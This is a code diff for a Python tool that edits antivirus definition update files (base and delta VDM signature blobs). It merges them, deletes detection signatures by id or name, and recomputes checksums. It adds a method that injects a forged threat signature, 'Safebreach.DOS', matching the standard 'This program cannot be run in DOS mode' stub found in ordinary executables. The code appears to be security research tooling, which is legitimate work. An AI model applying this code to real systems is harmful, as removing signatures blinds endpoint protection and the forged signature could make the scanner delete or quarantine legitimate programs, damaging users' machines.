@@ -1,10 +1,12 @@
-import io
 import logging
 
 from core.merge import Merger
-from core.utils import intersect
+from core.utils import compute_crc32
 from core.vdm import BaseVdm, DeltaVdm
-from core.signatures.deltablob import CopyFromDelta, COPY_FROM_BASE
+from core.utils.interval import Interval
+from core.signatures import Signature
+from core.signatures.threat import Threat, ThreatBegin, ThreatEnd
+from core.signatures.deltablob import CopyFromDelta, CopyFromBase
 
 class DefinitionPair:
     def __init__(self, basevdm: BaseVdm, deltavdm: DeltaVdm) -> None:
@@ -20,64 +22,95 @@ class DefinitionPair:
 
     def finallize_blob(self):
         merger = Merger(self.basevdm, self.deltavdm)
-        merge = merger.merge()
+        threats = merger.merge()
+        threats_stream = threats.pack()
+        threats_stream.seek(0, 2)
 
-        blob = self.deltavdm.extract_blob()
-        blob.mrgsize = merge.length
-        blob.mrgcrc  = merge.crc32
-
-        self.deltavdm.set_delta_blob(blob)
+        self.deltavdm.blob.mergesize = threats_stream.tell()
+        self.deltavdm.blob.mergecrc  = compute_crc32(threats_stream)
     
+    def add_dos_threat(self):
+        dos_threat = Threat()
+        
+        begin = ThreatBegin(_id=0x123, _counter=1, _category=8, _name=b'Safebreach.DOS', _sections=[0x4001], _footer=b'\x05\x82\x70\x00\x04\x00')
+        end = ThreatEnd(0x123)
+
+        dos_threat.begin = begin
+        dos_threat.end = end
+
+        raw_data2= b'\x01\x00\x01\x00\x01\x00\x00\x01\x00\x27\x01!This program cannot be run in DOS mode\x00\x00'
+        
+        sig2 = Signature(0x78, raw_data2)
+    
+        dos_threat.push(sig2)
+
+        self.deltavdm.insert_signature_as_action(dos_threat.pack_bytes())
+
+        self.finallize_blob()
+
     def delete_threat(self, id:int = None, name:bytes = None, finallize_blob:bool = True):
         merger = Merger(self.basevdm, self.deltavdm)
-        merge  = merger.merge()
-        threat_position = merge.get_threat(id, name).position
-        
-        self.__internal_delete_threat(merger, threat_position, 0)
+        threats  = merger.merge()
+        threat = threats.get(id, name)
+
+        if not threat:
+            return
+
+        interval = threat.interval
+        self.__internal_delete_threat(interval)
                 
         if finallize_blob:
             self.finallize_blob()
 
     def delete_all_threats_containing(self, name):
         merger = Merger(self.basevdm, self.deltavdm)
-        merge  = merger.merge()
+        threats  = merger.merge()
         
         fix_value = 0
-        total_delta = 0
-        
-        for threat in merge.get_threats_containing(name):
+
+        for threat in threats.match(name):
             print(f"      Deleting -> {threat.name}")
-            threat.fix_position(fix_value)
-            total_delta += self.__internal_delete_threat(merger, threat.position, total_delta)
+            threat.interval += fix_value
+            self.__internal_delete_threat(threat.interval)
             fix_value -= threat.size
 
         self.finallize_blob()
 
-    def __internal_delete_threat(self, merger: Merger, threat_pos: tuple, delta_seed: int) -> int:
-        remainder = 0
-        total_delta = delta_seed
+    def insert_threat(self, threat: Threat):
+        self.deltavdm.insert_signature_as_action(threat)
+
+    def __internal_delete_threat(self, _threat_interval: Interval):
+        merger = Merger(self.basevdm, self.deltavdm)
+        old_actions = []
+        new_actions = []
 
         for action in merger.yield_merge():
+            if Interval.overlaps(action.merge_interval, _threat_interval):
+                intersection = Interval.intersect(action.merge_interval, _threat_interval)
 
-            if action.merge_overlap(threat_pos):
-                intersection = intersect(threat_pos, action.merge_pos)
-                new_actions, cur_delta = action.slice_range(intersection)
-                total_delta += cur_delta
+                _cur_new_actions = action.slice(intersection)
+                self.__normalize_actions(_cur_new_actions)
 
-                for i, new_action in enumerate(new_actions):
-                    if new_action.type == COPY_FROM_BASE and new_action.size < 6:
-                        current_offset = self.basevdm.signatures.tell()
-                        self.basevdm.signatures.seek(new_action.offset)
-                        _data = self.basevdm.signatures.read(new_action.size)
-                        self.basevdm.signatures.seek(current_offset)
-                        _action = CopyFromDelta(_data)
-                        _action.set_merge_position(new_action.merge_pos)
-                        new_actions[i] = _action
-                        
-                action.fix_position(remainder)
-                remainder += self.deltavdm.replace_actions(action, new_actions)
-            
-            if action.merge_start > threat_pos[1]:
+                old_actions.append(action)
+                new_actions.extend(_cur_new_actions)
+                    
+            if action.interval.start > _threat_interval.end:
                 break
-            
-        return total_delta
+        
+        if old_actions:
+            self.deltavdm.blob.replace(old_actions, new_actions)
+    
+    def __normalize_actions(self, _actions):
+        for i, new_action in enumerate(_actions):
+            if new_action.type == CopyFromBase.Type and new_action.size < 6:
+                current_offset = self.basevdm.signatures.tell()
+                
+                self.basevdm.signatures.seek(new_action.offset)
+                _data = self.basevdm.signatures.read(new_action.size)
+                
+                self.basevdm.signatures.seek(current_offset)
+                
+                #_action = CopyFromDelta(_data)
+                #_action.set_merge_position(new_action.merge_pos)
+                
+                _actions[i] = CopyFromDelta(_data)
